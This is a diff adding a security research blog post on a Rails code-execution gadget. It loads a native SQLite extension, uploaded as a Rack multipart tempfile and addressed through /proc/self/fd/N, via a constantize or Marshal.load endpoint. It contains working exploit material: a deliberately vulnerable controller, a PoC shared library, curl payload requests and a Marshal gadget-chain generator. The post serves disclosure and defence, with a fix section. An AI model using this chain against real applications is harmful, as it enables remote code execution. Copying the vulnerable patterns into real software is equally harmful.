@@ -1,0 +1,429 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bypassing Temp File Randomization: /proc/self/fd/N + sqlite3 Extensions RCE in Rails — shoo0lin</title>
+<meta name="description" content="A new gadget for an old class of bug: a Rails sqlite3 extension primitive plus a Rack multipart tempfile reached through /proc/self/fd/N. Tested on Rails 8.0.1, Ruby 3.4, sqlite3 1.8.0.">
+<meta name="author" content="shoo0lin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypassing Temp File Randomization: /proc/self/fd/N + sqlite3 Extensions RCE in Rails">
+<meta property="og:description" content="A sqlite3 extension gadget and a /proc/self/fd/N path to Rack's randomized multipart tempfile — a research note on exploiting already-dangerous reflection and Marshal.load patterns.">
+<meta property="og:url" content="https://shoo0lin.github.io/posts/rails-sqlite3-fd-rce.html">
+<meta name="twitter:card" content="summary">
+<link rel="stylesheet" href="../assets/css/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23000000'/><rect x='30' y='30' width='40' height='40' fill='%23ff0000'/></svg>">
+</head>
+<body>
+
+<div class="rails" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="../index.html"><span class="dot"></span>shoo0lin<span class="slash">/</span>notes</a>
+    <nav class="nav">
+      <a href="../index.html">Posts</a>
+      <a href="#tldr">TL;DR</a>
+      <a href="#fix">The fix</a>
+      <a class="hide-sm" href="https://github.com/shoo0lin" rel="me">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <section class="post-hero">
+    <div class="wrap post-hero-inner">
+      <div class="c-tag">Rails · sqlite3 · Unsafe reflection · Research note</div>
+      <h1>Bypassing Temp File Randomization: /proc/self/fd/N + sqlite3 Extensions RCE in Rails</h1>
+      <p class="dek">Two things that are each unremarkable on their own — a gem that can load a native extension at construction time, and a file descriptor that points at an attacker's upload — become code execution when the application already calls <code>constantize</code> on user input.</p>
+      <div class="byline">
+        <span>23 Nov 2026</span>
+        <span>14 min read</span>
+        <span>Research note</span>
+        <span>HackerOne #3505185</span>
+      </div>
+    </div>
+  </section>
+
+  <article class="article">
+    <div class="prose">
+
+      <div class="tldr" id="tldr">
+        <h2>TL;DR</h2>
+        <p>An endpoint that does <code>params[:type].constantize.new(*params[:args])</code> on user input is already a critical vulnerability. So is an endpoint that does <code>Marshal.load</code> on user input. This note is not about those patterns; it is about what still works through them after the well-known gadgets were patched.</p>
+        <p>The contribution is a pair of primitives: <code>SQLite3::Database.new(path, extensions: [...])</code> loads a native shared library as the object is constructed, and Rack's randomized multipart tempfile can be addressed without knowing its random suffix by going through <code>/proc/self/fd/N</code>, where the descriptor number is small and enumerable.</p>
+        <p>Tested end to end on a minimal production Rails app: Rails <code>8.0.1</code>, Ruby <code>3.4</code>, sqlite3 <code>1.8.0</code>. Both the reflection endpoint and a <code>Marshal.load</code> gadget chain reached code execution in that testbed.</p>
+        <p><strong>Boundary, stated up front:</strong> this is a new gadget for already-dangerous code, not a vulnerability in Rails, Rack, or sqlite3. The Rails maintainer agreed and closed the report Informative with a recommendation to publish. I am publishing the mechanism, not a claim that every Rails deployment is affected.</p>
+      </div>
+
+      <div class="note">
+        <b>What this post does and does not claim</b>
+        No live third-party target was touched; everything below ran in a local Docker container. I did not establish a full affected-version matrix, so I am not publishing one — the pinned testbed and the version caveat are in <a href="#versions">Scope and version notes</a>. The descriptor number is per-process and per-run: it was <code>13</code> in the reflection experiment and <code>12</code> in the later Marshal experiment. Treat those as observations, not constants. Where the source material contained unverified timing claims or an overbroad "all Rails applications" impact statement, I have removed them rather than sharpen them.
+      </div>
+
+      <nav class="toc" aria-label="Contents">
+        <div class="t">Contents</div>
+        <ol>
+          <li><a href="#precondition">The precondition</a></li>
+          <li><a href="#gadgets">Why gadgets still matter</a></li>
+          <li><a href="#testbed">The testbed</a></li>
+          <li><a href="#sink">Finding the sqlite3 sink</a></li>
+          <li><a href="#upload">Getting a file onto the box</a></li>
+          <li><a href="#fd">/proc/self/fd/N</a></li>
+          <li><a href="#reflection">Reflection: constructing the database</a></li>
+          <li><a href="#marshal">Marshal: the same sink from deserialisation</a></li>
+          <li><a href="#versions">Scope and version notes</a></li>
+          <li><a href="#fix">The fix</a></li>
+          <li><a href="#disclosure">Disclosure</a></li>
+          <li><a href="#receipts">Receipts</a></li>
+        </ol>
+      </nav>
+
+      <h2 id="precondition"><span class="ch">Prologue</span>The precondition</h2>
+
+      <p class="dropcap">There is a category of Rails bug that stops being interesting the moment you find it. If user input reaches <code>String#constantize</code>, <code>safe_constantize</code>, <code>Module#const_get</code>, or <code>Marshal.load</code>, the application has already lost its security boundary. Brakeman has been flagging the reflection form since about 2013.</p>
+
+      <p>The two endpoints in this research were deliberately minimal:</p>
+
+      <pre><code>def reflection
+  vuln_params[:type].constantize.new(*vuln_params[:args])
+  render json: { success: true }
+end
+
+def marshal
+  deserialised = Marshal.load(Base64.decode64(vuln_params[:deserialise]))
+  render json: { data: deserialised.to_s }
+end
+
+def vuln_params
+  params.permit!
+end</code><button class="copy">copy</button></pre>
+
+      <p>Nobody needs a write-up to tell you those are dangerous. The question I actually wanted answered was narrower: <em>after the classic gadgets were patched, is there still a default-installed primitive that turns this into native code execution?</em></p>
+
+      <h2 id="gadgets"><span class="ch">Chapter 1</span>Why gadgets still matter</h2>
+
+      <p>The historical reflection gadget was <code>Logger</code>: its constructor used Ruby's <code>Kernel#open</code> on the log path, and a path starting with a pipe character ran a command. That was changed to <code>File.open</code> in 2017, closing the command-execution path while leaving <code>Logger.new("create/file/anywhere.txt")</code> as an arbitrary-file-create primitive.</p>
+
+      <p>Two prior bodies of work mapped the space. Conviso's research on unsafe reflection in Rails documented the <code>Logger</code> technique and related gadgets; Justin Collins's work on <code>constantize</code> showed that gems with an unsafe <code>const_missing</code> could leak memory with only <code>params[:class].classify.constantize</code>. The useful lesson from both is that the gadget set is a property of <em>what is installed</em>, not of your application code — which is why a minimal default installation is the right place to look.</p>
+
+      <p>I used Semgrep to surface candidate sinks in the installed gems and Ruby standard library. It raised a little over a thousand; I manually reduced them to constructors where attacker-influenced arguments actually reach a dangerous call. The candidates that survived are worth listing because most are not code execution:</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Class</th><th>Primitive</th><th>Code execution?</th></tr></thead>
+          <tbody>
+            <tr><td><code>RDoc::RI::Driver</code></td><td><code>extra_doc_dirs</code> → <code>cache.ri</code> → <code>Marshal.load</code></td><td>yes, but needs a controlled folder</td></tr>
+            <tr><td><code>SQLite3::Database</code></td><td><code>extensions:</code> loads a native library at construction</td><td><span class="pill red">yes</span> — the subject of this post</td></tr>
+            <tr><td><code>Logger</code></td><td>arbitrary file create, no content control</td><td>no (patched 2017)</td></tr>
+            <tr><td><code>Gem::ConfigFile</code></td><td><code>--debug</code> flips <code>$DEBUG</code></td><td>no</td></tr>
+            <tr><td><code>TCPServer</code> / <code>TCPSocket</code></td><td>open-port probing via exception behaviour</td><td>no</td></tr>
+            <tr><td><code>ActiveSupport::ConfigurationFile</code></td><td>arbitrary file read, if the object is returned to the caller</td><td>no</td></tr>
+            <tr><td><code>ENV</code></td><td>environment disclosure via <code>constantize.to_json</code></td><td>no</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>Two of them — <code>RDoc::RI::Driver</code> and <code>SQLite3::Database</code> — need a file on disk that the attacker controls. That constraint turned out to be the interesting part of the research.</p>
+
+      <h2 id="testbed"><span class="ch">Chapter 2</span>The testbed</h2>
+
+      <p>The environment was a minimal, production-mode Rails app in Docker, adapted from a base image published by Luke Jahnke. Cleaned up, the Dockerfile is:</p>
+
+      <pre><code>FROM ruby:3.4
+
+RUN gem install rails:8.0.1
+
+RUN rails new vuln_app --minimal --api
+WORKDIR vuln_app/
+
+RUN cat &lt;&lt;'EOF' &gt; route_create_template.rb
+route 'post "/reflection", to: "vuln#reflection"'
+route 'post "/marshal",    to: "vuln#marshal"'
+EOF
+RUN ./bin/rails app:template LOCATION=route_create_template.rb
+
+RUN cat &lt;&lt;'EOF' &gt; app/controllers/vuln_controller.rb
+require "base64"
+
+class VulnController &lt; ApplicationController
+  # ... reflection, marshal and vuln_params as above ...
+end
+EOF
+
+ENV RAILS_ENV="production"
+ENTRYPOINT ["./bin/rails", "server", "--binding=0.0.0.0"]</code><button class="copy">copy</button></pre>
+
+      <p>No ActiveStorage, no upload feature, no extra gems beyond what <code>rails new --minimal --api</code> installs. That last point matters: the sqlite3 gem comes from the default Rails dependency set, so the sink is present without the developer opting into anything exotic.</p>
+
+      <h2 id="sink"><span class="ch">Chapter 3</span>Finding the sqlite3 sink</h2>
+
+      <p>The sqlite3 gem's <code>Database.new</code> accepts an <code>extensions:</code> option. Each entry is a path to a native SQLite extension library, and SQLite loads it — calling its initialisation function — while the database object is being constructed. There is no separate "load extension" step for an attacker to reach: construction is the sink.</p>
+
+      <p>The proof-of-concept library is about as small as a shared object can be:</p>
+
+      <pre><code>/* poc.c */
+#include &lt;stdlib.h&gt;
+
+int sqlite3_extension_init(void) {
+  system("touch /tmp/rce-conf.txt");
+  return 0;
+}</code><button class="copy">copy</button></pre>
+
+      <pre><code>gcc -shared -fPIC -o payload.so poc.c</code><button class="copy">copy</button></pre>
+
+      <p>If the application constructs a <code>SQLite3::Database</code> with a path to that library in <code>extensions:</code>, the <code>touch</code> runs in the Rails process. The remaining problem is purely logistical: where do we put <code>payload.so</code>, and how do we name it if we cannot control the filename?</p>
+
+      <h2 id="upload"><span class="ch">Chapter 4</span>Getting a file onto the box</h2>
+
+      <p>The test app has no upload feature, but Rails still parses multipart request bodies through Rack before it dispatches to any route. Rack's multipart parser creates a <code>Tempfile</code> for each uploaded part even when the target path does not exist — the file is written during parsing, not by the controller.</p>
+
+      <pre><code>cat hello.txt
+# i am in your filesystem :)
+
+curl -F 'file=@hello.txt' http://127.0.0.1:3000/</code><button class="copy">copy</button></pre>
+
+      <p>Inside the container:</p>
+
+      <pre><code>root@container:/tmp# ls -al
+total 12
+drwxrwxrwt 1 root root 4096 Feb 25 14:29 .
+drwxr-xr-x 1 root root 4096 Feb 25 14:28 ..
+-rw------- 1 root root   27 Feb 25 14:29 RackMultipart20250225-1-sc9f98.txt
+
+root@container:/tmp# cat RackMultipart20250225-1-sc9f98.txt
+i am in your filesystem :)</code><button class="copy">copy</button></pre>
+
+      <p>The upload works, and the suffix is controlled by the part's content type — a <code>.so</code> part produces a <code>.so</code> tempfile. But the six random characters in the middle are not controllable. <code>RDoc::RI::Driver</code> needs a fixed name (<code>cache.ri</code>) inside a folder, so that gadget is out. The sqlite3 gadget needs only a <em>path</em>, which leaves one more trick available.</p>
+
+      <h2 id="fd"><span class="ch">Chapter 5</span>/proc/self/fd/N</h2>
+
+      <p>While the request is being handled, the Rails process holds an open descriptor to its multipart tempfile. On Linux, <code>/proc/self/fd/N</code> is a symbolic link to the opened file, so the descriptor is a usable path that does not contain the random suffix at all. Descriptor numbers are small integers in a narrow range and can be enumerated.</p>
+
+      <pre><code>root@container:/proc/1/fd# ls -al
+total 0
+dr-x------ 2 root root  0 Feb 25 14:30 .
+dr-xr-xr-x 9 root root  0 Feb 25 14:28 ..
+lrwx------ 1 root root 64 Feb 25 14:30 0 -&gt; /dev/null
+l-wx------ 1 root root 64 Feb 25 14:30 1 -&gt; 'pipe:[78561674]'
+lrwx------ 1 root root 64 Feb 25 14:30 12 -&gt; /tmp/RackMultipart20250225-1-sc9f98.txt
+l-wx------ 1 root root 64 Feb 25 14:30 2 -&gt; 'pipe:[78561675]'
+lrwx------ 1 root root 64 Feb 25 14:30 3 -&gt; 'anon_inode:[eventfd]'
+...
+lrwx------ 1 root root 64 Feb 25 14:30 13 -&gt; /tmp/RackMultipart20250225-1-oji5wc.so
+
+root@container:/proc/1/fd# cat /proc/1/fd/12
+i am in your filesystem :)</code><button class="copy">copy</button></pre>
+
+      <p>That is the whole bypass. Rack randomises the filename; the descriptor path does not use the filename.</p>
+
+      <h2 id="reflection"><span class="ch">Chapter 6</span>Reflection: constructing the database</h2>
+
+      <p>With <code>payload.so</code> uploaded and its descriptor identified, the reflection endpoint does the rest. The JSON arguments map directly onto <code>SQLite3::Database.new(database_path, options)</code>:</p>
+
+      <pre><code>curl -X POST http://127.0.0.1:3000/reflection \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"SQLite3::Database",
+       "args":["/tmp/rce.db",
+               {"extensions":["/proc/self/fd/13"]}]}'</code><button class="copy">copy</button></pre>
+
+      <p>The database object is constructed, SQLite loads the extension from the descriptor, and the initialisation function runs:</p>
+
+      <pre><code>root@container:/tmp# ls -al
+total 28
+drwxrwxrwt 1 root root 4096 Feb 25 14:32 .
+drwxr-xr-x 1 root root 4096 Feb 25 14:28 ..
+-rw------- 1 root root 15560 Feb 25 14:30 RackMultipart20250225-1-oji5wc.so
+-rw------- 1 root root    27 Feb 25 14:29 RackMultipart20250225-1-sc9f98.txt
+-rw-r--r-- 1 root root     0 Feb 25 14:32 rce-conf.txt
+-rw-r--r-- 1 root root     0 Feb 25 14:31 rce.db</code><button class="copy">copy</button></pre>
+
+      <p>The empty <code>rce-conf.txt</code> is the code-execution marker. In this testbed it was created by a <code>touch</code>; a real payload would do considerably more, and would run with the privileges of the Rails process.</p>
+
+      <h2 id="marshal"><span class="ch">Chapter 7</span>Marshal: the same sink from deserialisation</h2>
+
+      <p><code>SQLite3::Database</code> objects themselves do not serialise cleanly, so the reflection gadget cannot simply be marshalled. The route in is <code>ActiveRecord::ConnectionAdapters::SQLite3Adapter</code>: its <code>connect!</code> path ends in <code>new_client</code>, which calls <code>SQLite3::Database.new(config[:database].to_s, config)</code>. That gives a deserialisation chain:</p>
+
+      <pre><code>ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
+  -&gt; @instance  = SQLite3Adapter (with @connection_parameters)
+  -&gt; @method    = :connect!
+  -&gt; @deprecator = ActiveSupport::Deprecation.new
+       -&gt; connect! / new_client
+            -&gt; SQLite3::Database.new(database, extensions: ["/proc/self/fd/N"])</code><button class="copy">copy</button></pre>
+
+      <p><code>DeprecatedInstanceVariableProxy</code> is the same gadget Hailey Somerville used against CVE-2013-0156. One detail has changed since 2013: the proxy now requires <code>@deprecator</code> to be set, or it raises before invoking the target method. The proof-of-concept generator sets it explicitly.</p>
+
+      <pre><code>#!/usr/bin/env ruby
+# usage: ruby sqlite-marshal-poc.rb &lt;fd&gt;
+# example: ruby sqlite-marshal-poc.rb 12
+
+require "base64"
+require "concurrent"
+
+# Minimal stand-ins so Marshal.dump produces the right shape without
+# booting a full Rails application in the generator.
+class ActiveRecord
+  class ConnectionAdapters
+    class SQLite3Adapter
+      def initialize(*)
+        @connection_parameters = nil
+        @config = nil
+        @lock = nil
+      end
+    end
+  end
+end
+
+class ActiveSupport
+  class Concurrency
+    module NullLock; end
+  end
+
+  class Deprecation
+    def initialize
+      @gem_name = "Rails"
+      @deprecation_horizon = "8.1"
+      @silenced = false
+      @debug = false
+      @silence_counter = Concurrent::ThreadLocalVar.new(0)
+      @default_block = nil
+      @default = nil
+      @index = 22
+      @explicitly_allowed_warnings = Concurrent::ThreadLocalVar.new(nil)
+    end
+
+    class DeprecatedInstanceVariableProxy
+      def initialize(instance, method)
+        @instance = instance
+        @method = method
+      end
+    end
+  end
+end
+
+fd = ARGV[0]
+abort("Need to set target fd") unless fd
+
+adapter = ActiveRecord::ConnectionAdapters::SQLite3Adapter.allocate
+adapter.instance_variable_set(:@connection_parameters,
+  { database: "/tmp/r.db", extensions: ["/proc/self/fd/#{fd}"] })
+adapter.instance_variable_set(:@config,
+  { connection_retries: 1, database: ":memory:" })
+adapter.instance_variable_set(:@lock, ActiveSupport::Concurrency::NullLock)
+
+proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
+proxy.instance_variable_set(:@instance, adapter)
+proxy.instance_variable_set(:@method, :connect!)
+proxy.instance_variable_set(:@var, "@connect!")
+proxy.instance_variable_set(:@deprecator, ActiveSupport::Deprecation.new)
+
+puts Base64.encode64(Marshal.dump(proxy)).gsub("\n", "")</code><button class="copy">copy</button></pre>
+
+      <p>In the second experiment the uploaded <code>payload.so</code> landed on descriptor <code>12</code>, so the generator was run with <code>12</code> and the resulting Base64 sent to the <code>/marshal</code> endpoint. The same <code>rce-conf.txt</code> marker appeared. The descriptor number is an argument for a reason: it changes between runs and must be established from the target process, not assumed.</p>
+
+      <div class="warn">
+        <b>The precondition is the finding</b>
+        Both paths end in native code execution, so it would be easy to call this a Rails remote-code-execution vulnerability. It isn't. An application that lets user input select a class to instantiate, or feeds user input to <code>Marshal.load</code>, already has arbitrary code execution available to anyone who knows a suitable gadget. This research adds a gadget that survives the 2017 <code>Logger</code> fix and works from a default installation; it does not create the dangerous pattern.
+      </div>
+
+      <h2 id="versions"><span class="ch">Chapter 8</span>Scope and version notes</h2>
+
+      <p>Everything demonstrated here was on one pinned stack:</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Component</th><th>Tested version</th><th>Note</th></tr></thead>
+          <tbody>
+            <tr><td>Ruby</td><td><code>3.4</code></td><td>from <code>ruby:3.4</code></td></tr>
+            <tr><td>Rails</td><td><code>8.0.1</code></td><td><code>rails new vuln_app --minimal --api</code></td></tr>
+            <tr><td>sqlite3 gem</td><td><code>1.8.0</code></td><td><code>extensions:</code> accepted in this testbed</td></tr>
+            <tr><td>Rails environment</td><td><code>production</code></td><td><code>ENV RAILS_ENV="production"</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>There is a version wrinkle worth recording honestly. The current ActiveRecord SQLite3 adapter documentation annotates the <code>extensions</code> option as requiring sqlite3 <code>2.4.0</code> or later, while the pinned testbed resolved sqlite3 <code>1.8.0</code> and accepted the option. I did not build a matrix across Rails 6.1/7.x or older gem combinations, and I am not going to present an inferred "affected versions" table as measured evidence. Anyone reproducing this should check the resolved sqlite3 version in their own bundle rather than trust a range in a blog post.</p>
+
+      <p>The same discipline applies to impact. In the container, the payload ran as <code>root</code> and proved execution by creating a file. On a real deployment the ceiling is the privileges of the Rails process — which is exactly why the underlying reflection bug was critical before this gadget was found.</p>
+
+      <h2 id="fix"><span class="ch">Chapter 9</span>The fix</h2>
+
+      <p>There is no patch to ship for this, because the responsible fix is upstream of the gadget:</p>
+
+      <p><strong>1. Remove the dangerous pattern.</strong> Do not pass user input to <code>constantize</code>, <code>safe_constantize</code>, <code>const_get</code>, or <code>Marshal.load</code>. If you need polymorphic construction, map a small allowlist of identifiers to classes your code selects explicitly. If you need serialisation, use a format that does not instantiate arbitrary types.</p>
+
+      <p><strong>2. Find every instance.</strong> A grep is a good first pass and Brakeman is better:</p>
+
+      <pre><code>grep -RnE 'constantize|safe_constantize|const_get|Marshal\.load' app/ lib/
+brakeman --ensure-latest --enable-all-checks -p .</code><button class="copy">copy</button></pre>
+
+      <p>Brakeman flags the reflection pattern, but it cannot know which gadgets are installed — so a clean scan of the <em>gadget</em> class is not something to wait for.</p>
+
+      <p><strong>3. Treat native extension loading as a sensitive capability.</strong> The sqlite3 maintainers have an open question here: whether loading extensions through the database constructor should require explicit opt-in. That is a defence-in-depth improvement, not a fix for applications that hand user input to class constructors.</p>
+
+      <p><strong>4. Limit what the process can reach.</strong> A dedicated unprivileged user, a read-only filesystem where possible, and an egress policy all reduce the ceiling of any code-execution gadget. They do not remove the reflection bug, but they change what a successful exploit can do next.</p>
+
+      <h2 id="disclosure"><span class="ch">Chapter 10</span>Disclosure</h2>
+
+      <p>Reported to the Rails programme on HackerOne as <code>#3505185</code> on 9 January 2026. A maintainer replied on 11 January that they would investigate, and the report was closed Informative on 20 January with a recommendation to publish. The relevant part of the response, quoted verbatim:</p>
+
+      <blockquote>
+        <p>The research is thorough, and the /proc/self/fd/N technique for bypassing temp file randomization is clever.</p>
+        <p>What you've found is a new gadget to exploit already-dangerous code patterns, not a vulnerability in Rails, sqlite3, or Rack themselves.</p>
+        <p>We'd encourage you to publish this research</p>
+      </blockquote>
+
+      <p>That is the correct scoping, and it is the one this post uses. The interesting artefact is the technique: a randomized temporary filename is not a security boundary when the process hands you a stable descriptor path to the same file.</p>
+
+      <h2 id="receipts"><span class="ch">Epilogue</span>Receipts</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Artefact</th><th>What it establishes</th></tr></thead>
+          <tbody>
+            <tr><td>Docker testbed</td><td>Rails 8.0.1 / Ruby 3.4 / sqlite3 1.8.0, minimal API app in production mode</td></tr>
+            <tr><td>Multipart probe</td><td>Rack writes an uploaded <code>.so</code> to <code>/tmp</code> even with no upload route</td></tr>
+            <tr><td><code>/proc/1/fd</code> listing</td><td>Descriptor path points at the randomized tempfile; <code>cat</code> confirms the contents</td></tr>
+            <tr><td>Reflection POST</td><td><code>SQLite3::Database.new</code> with an fd path loads the extension</td></tr>
+            <tr><td><code>/tmp/rce-conf.txt</code></td><td>Code-execution marker created by the extension's init function</td></tr>
+            <tr><td>Marshal generator + POST</td><td>Same sink reached through <code>DeprecatedInstanceVariableProxy</code> → <code>connect!</code></td></tr>
+            <tr><td>HackerOne #3505185</td><td>Disclosure record and maintainer's scope assessment, quoted above</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>Two things I would take away from this if I were reviewing code rather than writing about it. First, <strong>a randomised filename is not containment</strong>: on Linux the descriptor table is a second, unrandomised name for the same object. Second, <strong>the value of gadget research is in the boundary it describes</strong>, not the headline it could support. The maintainer was right that the bug was the reflection endpoint; the useful part was discovering what still works through it.</p>
+
+      <hr>
+
+      <p style="color:var(--faint);font-size:14px">All experiments were run locally in a disposable Docker container. No live Rails application, cloud account, or third-party service was contacted. Version claims are limited to the pinned testbed described above; no affected-version matrix is asserted. The maintainer's full response is in HackerOne report #3505185.</p>
+
+      <hr>
+      <p class="next"><a href="dispatcher-cache.html">← Read the next note: The Cache That Remembered a Stranger</a></p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>© 2026 shoo0lin · notes from the seam between server and browser</span>
+    <span><a href="../index.html">← All posts</a></span>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = pre.querySelector('.copy');
+  if (!btn) return;
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    navigator.clipboard.writeText(code.innerText).then(function () {
+      btn.textContent = 'copied';
+      setTimeout(function () { btn.textContent = 'copy'; }, 1200);
+    });
+  });
+});
+</script>
+</body>
+</html>
